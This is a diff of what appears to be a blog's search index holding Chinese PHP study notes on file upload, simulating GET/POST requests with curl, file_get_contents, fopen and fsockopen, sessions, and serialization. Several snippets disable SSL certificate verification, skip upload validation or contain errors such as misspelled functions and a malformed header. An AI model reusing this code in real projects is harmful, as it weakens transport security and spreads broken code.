+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_FILES);  //输出一个二维数组</span><br><span class="line"></span><br><span class="line">    include_once &apos;./1.html&apos;;</span><br><span class="line"></span><br><span class="line">    //上传文件</span><br><span class="line"></span><br><span class="line">    $f = empty($_FILES)?&quot;&quot; : $_FILES[&quot;file2&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    switch($_FILES[&quot;file2&quot;][&quot;error&quot;])</span><br><span class="line">    &#123;</span><br><span class="line">        case 0:</span><br><span class="line">        @move_upload_file($f,&quot;./111.jpg&quot;);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            # code...</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //变化</span><br><span class="line">    时间戳 -&gt; time().&quot;.jpg&quot;</span><br><span class="line">    后缀截取 -&gt; $filechar = $_FILES[&apos;file2&apos;][&apos;name&apos;] -&gt; 字符串处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php模拟get/post请求</title>
+    <url>/2020/07/12/php_get_post_simulation/</url>
+    <content><![CDATA[<hr>
+<h2 id="php模拟get-post请求"><a href="#php模拟get-post请求" class="headerlink" title="php模拟get/post请求"></a>php模拟get/post请求</h2><ul>
+<li>curl<ul>
+<li>file_put_contents()函数</li>
+<li>curl模拟GET请求</li>
+<li>curl模拟POST请求</li>
+</ul>
+</li>
+<li>file_get_contents<ul>
+<li>stream_context_create()函数</li>
+<li>http_build_query()函数</li>
+<li>file_get_contents()函数</li>
+<li>模拟GET请求</li>
+<li>模拟POST请求</li>
+</ul>
+</li>
+<li>fopen<ul>
+<li>stream_get_meta_data()函数</li>
+<li>模拟GET请求</li>
+</ul>
+</li>
+<li>fsockopen<ul>
+<li>fsockopen()函数</li>
+<li>parse_url()函数</li>
+<li>模拟GET请求</li>
+<li>模拟POST请求</li>
+</ul>
+</li>
+</ul>
+<h3 id="0X00-curl"><a href="#0X00-curl" class="headerlink" title="0X00 curl"></a>0X00 curl</h3><ul>
+<li>▲ 网上吹嘘curl库的强大，今天用来入门模拟一下GET和POST请求</li>
+<li>官方手册：<a href="https://www.php.net/manual/zh/ref.curl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.curl.php</a></li>
+<li>curl功能库简介：<a href="https://www.jb51.net/article/26751.htm" target="_blank" rel="noopener">https://www.jb51.net/article/26751.htm</a></li>
+<li>curl基础流程<ul>
+<li>curl_init()</li>
+<li>curl_setopt()</li>
+<li>curl_exec()</li>
+<li>curl_close()</li>
+</ul>
+</li>
+<li>▲ 支持多种代理模式（HTTP/FTP/SOCKS4/SOCKS5）</li>
+</ul>
+<h5 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a>file_put_contents()函数</h5><ul>
+<li>要写入的数据。类型可以是 string，array 或者是 stream 资源</li>
+<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-put-contents.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-put-contents.php</a></li>
+<li>▲ 可结合curl，将流数据，数组或者字符串写入文件</li>
+</ul>
+<h5 id="curl模拟GET请求"><a href="#curl模拟GET请求" class="headerlink" title="curl模拟GET请求"></a>curl模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">    $header = array();  //头部数组</span><br><span class="line">    $header[] = &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;;</span><br><span class="line">    $header[] = &apos;Cache-Control: no-cache&apos;;</span><br><span class="line">    $header[] = &apos;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&apos;;</span><br><span class="line">    $url = &apos;https://www.douban.com&apos;;  //要抓取的url</span><br><span class="line">    $ch = curl_init();  //curl初始化</span><br><span class="line">    $timeout = 15;  //超时时间</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  //关闭SSL点对点验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  //关闭SSL端对端验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  //设置请求头</span><br><span class="line">    curl_setopt($ch,　CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);  //设置代理方式</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROXY, &quot;127.0.0.1:1080&quot;);  //设置代理的服务器</span><br><span class="line">    $file_contents = curl_exec($ch);  //发送curl请求</span><br><span class="line">    curl_close($ch);  //关闭curl请求</span><br><span class="line">    //$file_contents = json_decode($file_contents);  //若接收数据为json数据，解码</span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //转换字符编码</span><br><span class="line">    $f = fopen(&quot;./1.html&quot;, &quot;a+&quot;);  //打开文件，模式为可写可读</span><br><span class="line">    Fwrite($f,$file_contents);  //写入文件</span><br><span class="line">    Fclose($f);  //关闭文件</span><br><span class="line">    print_r($file_contents);  //输出抓取的信息到屏幕上</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="curl模拟POST请求"><a href="#curl模拟POST请求" class="headerlink" title="curl模拟POST请求"></a>curl模拟POST请求</h5><ul>
+<li>test.php</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_POST);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $post_data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;age&apos; =&gt; &apos;21&apos; );  //post数据</span><br><span class="line">    $post_data = http_build_query($post_data);  //url-encode编码数据</span><br><span class="line">    $post_data = json_encode($post_data);  //json编码数据</span><br><span class="line">    $url = &apos;http://localhost/test.php&apos;;  //要抓取的url</span><br><span class="line">    $ch = curl_init();  //curl初始化</span><br><span class="line">    $timeout = 5;  //超时时间</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, 1);  //设置发送的方式为post</span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);  //设置post的数据</span><br><span class="line">    //curl_setopt($ch, CURLOPT_HTTPHEADER, array(&apos;Content-Type:application/json&apos;));  //json编码设置</span><br><span class="line">    $file_contents = curl_exec($ch);  //发送curl请求</span><br><span class="line">    curl_close($ch);  //关闭curl请求</span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //转换字符</span><br><span class="line">    print_r($file_contents);  //输出抓取的信息到屏幕</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="0X01-file-get-contents"><a href="#0X01-file-get-contents" class="headerlink" title="0X01 file_get_contents"></a>0X01 file_get_contents</h3><h5 id="stream-context-create-函数"><a href="#stream-context-create-函数" class="headerlink" title="stream_context_create()函数"></a>stream_context_create()函数</h5><ul>
+<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-context-create.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-context-create.php</a></li>
+<li>创建并返回一个文本数据流并应用各种选项，可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程</li>
+</ul>
+<h5 id="http-build-query-函数"><a href="#http-build-query-函数" class="headerlink" title="http_build_query()函数"></a>http_build_query()函数</h5><ul>
+<li>官方手册：<a href="https://www.php.net/manual/zh/function.http-build-query" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.http-build-query</a></li>
+<li>将数组转换 url-encoded 之后的请求字符串</li>
+<li>▲ 博客介绍使用：<a href="https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html</a></li>
+</ul>
+<h5 id="file-get-contents-函数"><a href="#file-get-contents-函数" class="headerlink" title="file_get_contents()函数"></a>file_get_contents()函数</h5><ul>
+<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-get-contents" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-get-contents</a></li>
+<li>将整个文件读入一个字符串</li>
+<li>▲ 2020.03.15 只支持HTTP代理 </li>
+<li>▲ 2020.03.15 对https的链接抓取会报错</li>
+</ul>
+<h5 id="模拟GET请求"><a href="#模拟GET请求" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line">    $html = file_get_contents($url);  //抓取url</span><br><span class="line">    print_r($html);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="模拟POST请求"><a href="#模拟POST请求" class="headerlink" title="模拟POST请求"></a>模拟POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //要发送的post数据</span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encode编码要post的数据</span><br><span class="line"></span><br><span class="line">    $options = array(</span><br><span class="line">        &apos;http&apos; =&gt; array(</span><br><span class="line">            &apos;method&apos; =&gt; &apos;POST&apos;,  //POST请求的方法</span><br><span class="line">            &apos;request_fulluri&apos;=&gt; true,</span><br><span class="line">            &apos;header&apos; =&gt; array(&quot;Accept-language: en&quot;,</span><br><span class="line">                &quot;Content-type: application/x-www-form-urlencoded&quot;,</span><br><span class="line">                &quot;user_agent: Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&quot;,</span><br><span class="line">                &quot;cookie: aaa=aaa&quot;),  //POST请求的头部，Content-type固定，其他可改</span><br><span class="line">            //&apos;proxy&apos; =&gt; &apos;tcp://127.0.0.1:22716&apos;,  //只支持HTTP代理</span><br><span class="line">            &apos;content&apos; =&gt; $post_data,  //POST的主体，也即POST的数据</span><br><span class="line">            &apos;timeout&apos; =&gt; 5)  //超时时间</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $options = stream_context_create($options);  //对要传输的数据进行流式处理</span><br><span class="line">    $html = file_get_contents($url,false,$options);  //POST情况下第三个参数要设置</span><br><span class="line">    echo $html;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>测试数据是否POST成功<ul>
+<li>test.php</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = $_POST;</span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    print_r( $data );</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改url为test.php的路径</li>
+<li>查看是否有输出结果</li>
+</ul>
+<h3 id="0X02-fopen"><a href="#0X02-fopen" class="headerlink" title="0X02 fopen"></a>0X02 fopen</h3><h5 id="stream-get-meta-data-函数"><a href="#stream-get-meta-data-函数" class="headerlink" title="stream_get_meta_data()函数"></a>stream_get_meta_data()函数</h5><ul>
+<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-get-meta-data" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-get-meta-data</a></li>
+<li>从封装协议文件指针中取得报头／元数据</li>
+<li>▲ 需是从 fopen()，fsockopen() 和 pfsockopen() 建立的流，返回的是一个数组</li>
+</ul>
+<h5 id="模拟GET请求-1"><a href="#模拟GET请求-1" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line">    $fp = fopen($url, &apos;r&apos;);  //以fopen的形式打开url</span><br><span class="line">    stream_get_meta_data($fp);  //转换数据为流</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">    &#123;</span><br><span class="line">        $result .= fgets($fp, 1024);  //取出拿到的数据放在字符串中</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //输出</span><br><span class="line">    fclose($fp);  //关闭文件指针</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0X03-fsockopen"><a href="#0X03-fsockopen" class="headerlink" title="0X03 fsockopen"></a>0X03 fsockopen</h3><h5 id="fsockopen-函数"><a href="#fsockopen-函数" class="headerlink" title="fsockopen()函数"></a>fsockopen()函数</h5><ul>
+<li>打开一个网络连接或者一个Unix套接字连接</li>
+<li>官方手册：<a href="https://www.php.net/manual/zh/function.fsockopen.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.fsockopen.php</a></li>
+<li>▲ 2020.03.16 能定制任意的连接，但作为网络抓取的成果是不理想的。若要做网络抓取，需要写完整的http请求并定制回送的http请求</li>
+<li>▲ 2020.03.16 存在waf，很难发送正常的数据</li>
+</ul>
+<h5 id="parse-url-函数"><a href="#parse-url-函数" class="headerlink" title="parse_url()函数"></a>parse_url()函数</h5><ul>
+<li>解析一个URL并返回一个关联数组，包含在 URL 中出现的各种组成部分</li>
+<li>官方手册：<a href="https://www.php.net/manual/zh/function.parse-url.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.parse-url.php</a></li>
+<li>▲ 2020.03.16 此函数对其他url中未有的参数不会进行默认设置</li>
+</ul>
+<h5 id="模拟GET请求-2"><a href="#模拟GET请求-2" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = array(&apos;host&apos; =&gt; &apos;www.wyu.cn&apos;, &apos;port&apos; =&gt; &apos;80&apos;,&apos;path&apos; =&gt; &apos;&apos;,&apos;query&apos;=&gt; &apos;/&apos; ,&apos;cookie&apos; =&gt; &apos;/&apos;);  //请求的url数组</span><br><span class="line">    $fp = fsockopen($url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);  //打开一个sock连接</span><br><span class="line">    $fp = fsockopen(&quot;ssl://&quot;.$url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);</span><br><span class="line">    //对https连接的支持</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;GET /$url[path] HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: 61.160.224.50:80\r\n&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //将http的头写入文件指针</span><br><span class="line">        while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //取出拿到的数据放在字符串中</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //关闭文件指针</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="模拟POST请求-1"><a href="#模拟POST请求-1" class="headerlink" title="模拟POST请求"></a>模拟POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn&apos;;  //要抓取的url</span><br><span class="line">    $url_info = parse_url($url);  //对url进行字段解析</span><br><span class="line"></span><br><span class="line">    $fp = fsockopen($url_info[&apos;host&apos;],80,$errno,$errstr,10);  ////打开一个sock连接</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //要发送的post数据</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encode编码要post的数据</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;POST &quot;.$url_info[&apos;path&apos;].&quot; HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: &quot;.$url_info[&apos;host&apos;].&quot;\r\n&quot;;</span><br><span class="line">        $out.= &quot;Content-type: application/x-www-form-urlencodedn&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        $out.= &quot;$post_data\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //将http的头写入文件指针</span><br><span class="line">        while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //取出拿到的数据放在字符串中</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //关闭文件指针</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+  </entry>
+  <entry>
     <title>php session</title>
     <url>/2020/07/12/php_session/</url>
     <content><![CDATA[<hr>
@@ -1038,257 +1732,6 @@
 </li>
 <li><p>session.lazy_write：配置会话数据在更改时是否被重写，默认启用</p>
 </li>
-</ul>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>php序列化</title>
-    <url>/2020/07/12/php_serialize_unserialize/</url>
-    <content><![CDATA[<hr>
-<h3 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h3><blockquote>
-<p>   ▲ 对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p>
-<p>   php序列化的函数为serialize，反序列化的函数为unserialize</p>
-</blockquote>
-<h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><ul>
-<li>php序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法</li>
-<li>例子<ul>
-<li>O代表是对象，表示改对象名称有4个字符，”Test”表示改对象的名称，3表示改对象里有3个成员</li>
-<li>变量的序列化<ul>
-<li>public属性序列化后为本身</li>
-<li>protected属性序列化后示方式是在变量名前加个%00*%00</li>
-<li>private属性序列化后示方式是在变量名前加个%00类名%00</li>
-</ul>
-</li>
-<li>括号里面的值根据分号来分开看，分号左边的是变量名，分号右边的是变量的值</li>
-<li>▲ 序列化不保存方法</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);</span><br><span class="line">    var_dump($sTest);  </span><br><span class="line">    // 输出为string(96) &quot;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:9:&quot;This is A&quot;;s:4:&quot;*b&quot;;s:9:&quot;This is B&quot;;s:7:&quot;Testc&quot;;s:9:&quot;This is C&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    解释</span><br><span class="line">    O 代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">    4 代表类名字占三个字符 </span><br><span class="line">    Test 类名</span><br><span class="line">    3 代表三个属性</span><br><span class="line">    s 代表字符串</span><br><span class="line">    1 代表属性名长度</span><br><span class="line">    a 属性名</span><br><span class="line">    s:9:&quot;This is A&quot; 字符串 属性值长度 属性值</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><ul>
-<li>例子</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);   </span><br><span class="line">    $uTest = unserialize($sTest);</span><br><span class="line">    var_dump($uTest);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //输出，还原成一个数组</span><br><span class="line">    object(Test)#2 (3) &#123;</span><br><span class="line">      [&quot;a&quot;]=&gt;</span><br><span class="line">      string(9) &quot;This is A&quot;</span><br><span class="line">      [&quot;b&quot;:protected]=&gt;</span><br><span class="line">      string(9) &quot;This is B&quot;</span><br><span class="line">      [&quot;c&quot;:&quot;Test&quot;:private]=&gt;</span><br><span class="line">      string(9) &quot;This is C&quot;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h5><ul>
-<li>官网地址：<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></li>
-<li>__construct()当一个对象创建时被调用</li>
-<li>__destruct()当一个对象销毁时被调用</li>
-<li>__toString()当一个对象被当作一个字符串使用<ul>
-<li>▲ __toString()则必须返回一个字符串</li>
-</ul>
-</li>
-<li>__sleep()在对象被序列化之前运行<ul>
-<li>▲ __sleep()期望能return一个数组</li>
-</ul>
-</li>
-<li>__wakeup()在对象被反序列化之后被调用</li>
-<li>__get()读取不可访问属性的值时被调用</li>
-<li>__invoke()当尝试以调用函数的方式调用一个对象时被调用</li>
-</ul>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>php模拟get/post请求</title>
-    <url>/2020/07/12/php_get_post_simulation/</url>
-    <content><![CDATA[<hr>
-<h2 id="php模拟get-post请求"><a href="#php模拟get-post请求" class="headerlink" title="php模拟get/post请求"></a>php模拟get/post请求</h2><ul>
-<li>curl<ul>
-<li>file_put_contents()函数</li>
-<li>curl模拟GET请求</li>
-<li>curl模拟POST请求</li>
-</ul>
-</li>
-<li>file_get_contents<ul>
-<li>stream_context_create()函数</li>
-<li>http_build_query()函数</li>
-<li>file_get_contents()函数</li>
-<li>模拟GET请求</li>
-<li>模拟POST请求</li>
-</ul>
-</li>
-<li>fopen<ul>
-<li>stream_get_meta_data()函数</li>
-<li>模拟GET请求</li>
-</ul>
-</li>
-<li>fsockopen<ul>
-<li>fsockopen()函数</li>
-<li>parse_url()函数</li>
-<li>模拟GET请求</li>
-<li>模拟POST请求</li>
-</ul>
-</li>
-</ul>
-<h3 id="0X00-curl"><a href="#0X00-curl" class="headerlink" title="0X00 curl"></a>0X00 curl</h3><ul>
-<li>▲ 网上吹嘘curl库的强大，今天用来入门模拟一下GET和POST请求</li>
-<li>官方手册：<a href="https://www.php.net/manual/zh/ref.curl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.curl.php</a></li>
-<li>curl功能库简介：<a href="https://www.jb51.net/article/26751.htm" target="_blank" rel="noopener">https://www.jb51.net/article/26751.htm</a></li>
-<li>curl基础流程<ul>
-<li>curl_init()</li>
-<li>curl_setopt()</li>
-<li>curl_exec()</li>
-<li>curl_close()</li>
-</ul>
-</li>
-<li>▲ 支持多种代理模式（HTTP/FTP/SOCKS4/SOCKS5）</li>
-</ul>
-<h5 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a>file_put_contents()函数</h5><ul>
-<li>要写入的数据。类型可以是 string，array 或者是 stream 资源</li>
-<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-put-contents.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-put-contents.php</a></li>
-<li>▲ 可结合curl，将流数据，数组或者字符串写入文件</li>
-</ul>
-<h5 id="curl模拟GET请求"><a href="#curl模拟GET请求" class="headerlink" title="curl模拟GET请求"></a>curl模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">    $header = array();  //头部数组</span><br><span class="line">    $header[] = &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;;</span><br><span class="line">    $header[] = &apos;Cache-Control: no-cache&apos;;</span><br><span class="line">    $header[] = &apos;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&apos;;</span><br><span class="line">    $url = &apos;https://www.douban.com&apos;;  //要抓取的url</span><br><span class="line">    $ch = curl_init();  //curl初始化</span><br><span class="line">    $timeout = 15;  //超时时间</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  //关闭SSL点对点验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  //关闭SSL端对端验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  //设置请求头</span><br><span class="line">    curl_setopt($ch,　CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);  //设置代理方式</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROXY, &quot;127.0.0.1:1080&quot;);  //设置代理的服务器</span><br><span class="line">    $file_contents = curl_exec($ch);  //发送curl请求</span><br><span class="line">    curl_close($ch);  //关闭curl请求</span><br><span class="line">    //$file_contents = json_decode($file_contents);  //若接收数据为json数据，解码</span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //转换字符编码</span><br><span class="line">    $f = fopen(&quot;./1.html&quot;, &quot;a+&quot;);  //打开文件，模式为可写可读</span><br><span class="line">    Fwrite($f,$file_contents);  //写入文件</span><br><span class="line">    Fclose($f);  //关闭文件</span><br><span class="line">    print_r($file_contents);  //输出抓取的信息到屏幕上</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="curl模拟POST请求"><a href="#curl模拟POST请求" class="headerlink" title="curl模拟POST请求"></a>curl模拟POST请求</h5><ul>
-<li>test.php</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_POST);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
